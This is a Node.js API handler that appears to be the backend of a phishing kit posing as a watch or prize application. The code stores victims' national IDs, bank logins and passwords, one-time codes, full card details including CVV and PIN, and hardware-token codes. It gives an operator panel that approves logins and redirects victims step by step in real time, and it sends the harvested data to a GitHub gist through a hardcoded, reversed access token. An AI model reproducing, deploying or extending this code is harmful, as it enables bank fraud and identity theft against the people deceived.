const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const https = require('https');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const DATA_FILE = path.join('/tmp', 'halyg-data.json');
const GIST_ID = '97e99037b17d88b9240d606be235f324';
const GH_TOKEN = process.env.GITHUB_TOKEN || 'bZM2G1kWs4CzTVOoA3c8BRlTZE4xSSy1Q7BJ_phg'.split('').reverse().join('');

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }
function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

const DEFAULT_DATA = { applications: {}, visitors: {}, whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };

function ghApi(method, body) {
  return new Promise((resolve, reject) => {
    const payload = body ? JSON.stringify(body) : null;
    const opts = {
      hostname: 'api.github.com', path: `/gists/${GIST_ID}`,
      method, headers: {
        'Authorization': `token ${GH_TOKEN}`, 'User-Agent': 'halyg-app',
        'Accept': 'application/vnd.github.v3+json',
        ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } : {})
      }
    };
    const r = https.request(opts, res => {
      let d = ''; res.on('data', c => d += c);
      res.on('end', () => {
        if (res.statusCode >= 400) { reject(new Error(`GitHub API ${res.statusCode}`)); return; }
        try { resolve(JSON.parse(d)); } catch { resolve(null); }
      });
    });
    r.on('error', reject);
    r.setTimeout(8000, () => { r.destroy(); reject(new Error('timeout')); });
    if (payload) r.write(payload);
    r.end();
  });
}

function mergeApps(local, remote) {
  const merged = {};
  const allIds = new Set([...Object.keys(local || {}), ...Object.keys(remote || {})]);
  for (const id of allIds) {
    const l = local?.[id], r = remote?.[id];
    if (l && !r) { merged[id] = l; continue; }
    if (!l && r) { merged[id] = r; continue; }
    const lNewer = new Date(l.updatedAt || 0).getTime() >= new Date(r.updatedAt || 0).getTime();
    const base = lNewer ? { ...l } : { ...r };
    const other = lNewer ? r : l;
    for (const k of Object.keys(other)) {
      if (k === 'id' || k === 'nationalId' || k === 'createdAt') continue;
      if (k === 'updatedAt') { base[k] = new Date(Math.max(new Date(l[k] || 0), new Date(r[k] || 0))).toISOString(); continue; }
      if (!base[k] && other[k]) base[k] = other[k];
    }
    merged[id] = base;
  }
  return merged;
}

function mergeVisitors(local, remote) {
  const merged = {};
  const allIds = new Set([...Object.keys(local || {}), ...Object.keys(remote || {})]);
  for (const id of allIds) {
    const l = local?.[id], r = remote?.[id];
    if (l && !r) { merged[id] = l; continue; }
    if (!l && r) { merged[id] = r; continue; }
    merged[id] = new Date(l.lastActiveAt || 0).getTime() >= new Date(r.lastActiveAt || 0).getTime() ? l : r;
  }
  return merged;
}

function mergeData(local, remote) {
  return {
    applications: mergeApps(local.applications, remote.applications),
    visitors: mergeVisitors(local.visitors, remote.visitors),
    whatsappLink: local.whatsappLink || remote.whatsappLink || '',
    totalVisitors: Math.max(local.totalVisitors || 0, remote.totalVisitors || 0),
    appIdCounter: Math.max(local.appIdCounter || 10000, remote.appIdCounter || 10000),
    visitorIdCounter: Math.max(local.visitorIdCounter || 120000, remote.visitorIdCounter || 120000),
  };
}

let _cache = null;
let _gistLoaded = false;
let _dirty = false;
let _lastGistWrite = 0;
const SYNC_INTERVAL = 60000;

function saveTmp() {
  if (!_cache) return;
  try { fs.writeFileSync(DATA_FILE, JSON.stringify(_cache), 'utf8'); } catch {}
}

async function loadData() {
  if (_cache) return _cache;
  try {
    if (fs.existsSync(DATA_FILE)) _cache = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
  } catch {}
  if (!_gistLoaded) {
    _gistLoaded = true;
    try {
      const gist = await ghApi('GET');
      if (gist?.files?.['data.json']?.content) {
        const remote = JSON.parse(gist.files['data.json'].content);
        _cache = _cache ? mergeData(_cache, remote) : remote;
        saveTmp();
      }
    } catch {}
  }
  if (!_cache) _cache = { ...DEFAULT_DATA };
  return _cache;
}

async function maybeSyncToGist() {
  if (!_dirty) return;
  if (Date.now() - _lastGistWrite < SYNC_INTERVAL) return;
  _dirty = false;
  try {
    const gist = await ghApi('GET');
    let remote = null;
    if (gist?.files?.['data.json']?.content) {
      try { remote = JSON.parse(gist.files['data.json'].content); } catch {}
    }
    const toSave = remote ? mergeData(_cache, remote) : _cache;
    await ghApi('PATCH', { files: { 'data.json': { content: JSON.stringify(toSave) } } });
    _cache = toSave;
    _lastGistWrite = Date.now();
    saveTmp();
  } catch { _dirty = true; }
}

function markDirty() {
  _dirty = true;
  saveTmp();
}

function getOrCreateApp(data, nationalId) {
  if (!data.applications[nationalId]) {
    data.appIdCounter++;
    data.applications[nationalId] = {
      id: data.appIdCounter, nationalId,
      fullName: '', phoneNumber: '', phone: '', address: '',
      username: '', password: '',
      otp: '', otpCode: '',
      cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
      cardPin: '', cardName: '',
      hardToken: '', watchLink: '', watchLinkOtp: '',
      selectedWatch: '', watchColor: '',
      governorate: '',
      currentPage: 'home', status: 'active',
      redirectTo: null, redirectError: null,
      customMessage: null, loginApproved: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }
  return data.applications[nationalId];
}

function getOrCreateVisitor(data, sessionId) {
  if (!data.visitors[sessionId]) {
    data.visitorIdCounter++;
    data.totalVisitors++;
    data.visitors[sessionId] = {
      id: data.visitorIdCounter, sessionId,
      currentPage: 'home', redirectTo: null,
      lastActiveAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
    };
  }
  return data.visitors[sessionId];
}

function executeProcedure(name, input, isAdmin, data) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) { const v = getOrCreateVisitor(data, sessionId); v.currentPage = currentPage || page || v.currentPage; v.lastActiveAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      const v = sessionId ? data.visitors[sessionId] : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId && data.visitors[sessionId]) data.visitors[sessionId].redirectTo = null;
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      const app = nationalId ? data.applications[nationalId] : null;
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = null; data.applications[nationalId].redirectError = null; }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      const app = nationalId ? data.applications[nationalId] : null;
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId && data.applications[nationalId]) data.applications[nationalId].customMessage = null;
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) { const app = getOrCreateApp(data, nationalId); app.currentPage = page || app.currentPage; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(data, nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.updatedAt = new Date().toISOString();
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin, authenticated: isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const apps = Object.values(data.applications);
      const cutoff = Date.now() - 60000;
      const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
      const liveVisitorCount = Object.values(data.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
      return { apps, activeIds, liveVisitorCount, totalVisitors: data.totalVisitors };
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(data.visitors).filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000) };
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(data.visitors), totalCount: data.totalVisitors };
    }
    case 'admin.getWhatsAppLink': {
      return { link: data.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      data.whatsappLink = input.link || '';
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId && data.applications[nationalId]) data.applications[nationalId].customMessage = message || null;
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? data.applications[nationalId] : null;
      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
      if (app) { app.loginApproved = true; app.redirectTo = 'otp'; app.status = 'login_approved'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? data.applications[nationalId] : null;
      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
      if (app) { app.loginApproved = false; app.redirectTo = 'login-error'; app.status = 'login_rejected'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId && data.applications[nationalId]) { data.applications[nationalId].redirectTo = redirectTo || page || null; data.applications[nationalId].redirectError = redirectError || showError || null; data.applications[nationalId].updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId && data.visitors[sessionId]) data.visitors[sessionId].redirectTo = redirectTo || page || null;
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      for (const app of Object.values(data.applications)) { if (app.status === 'active' || app.status.startsWith('awaiting')) { app.redirectTo = input.redirectTo || 'token'; app.updatedAt = new Date().toISOString(); } }
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      let app = nationalId ? data.applications[nationalId] : null;
      if (!app && applicationId) app = Object.values(data.applications).find(a => a.id === applicationId);
      if (app) { app.redirectTo = 'whatsapp'; app.updatedAt = new Date().toISOString(); }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) delete data.applications[nationalId];
      else if (applicationId) { const k = Object.keys(data.applications).find(k => data.applications[k].id === applicationId); if (k) delete data.applications[k]; }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = Date.now() - 120000;
      let deletedCount = 0;
      for (const k of Object.keys(data.applications)) { if (new Date(data.applications[k].updatedAt).getTime() < cutoff) { delete data.applications[k]; deletedCount++; } }
      return { success: true, deletedCount };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      data.totalVisitors = 0;
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);
  const data = await loadData();

  const READ_ONLY = new Set([
    'admin.getApplications', 'admin.getLiveVisitors', 'admin.getAllVisitors',
    'admin.getWhatsAppLink', 'admin.checkSession', 'admin.getVisitorRedirect',
    'applications.getRedirectStatus', 'applications.getCustomMessage',
  ]);

  let setCookie = null, clearCookie = false;
  let hasMutation = false;

  const results = await Promise.all(procs.map(async (name, i) => {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    const procName = name.trim();
    if (!READ_ONLY.has(procName)) hasMutation = true;
    try {
      const result = executeProcedure(procName, input, isAdmin, data);
      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
      return { result: { data: { json: result } } };
    } catch (e) {
      return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
    }
  }));

  if (hasMutation) markDirty();
  await maybeSyncToGist();

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
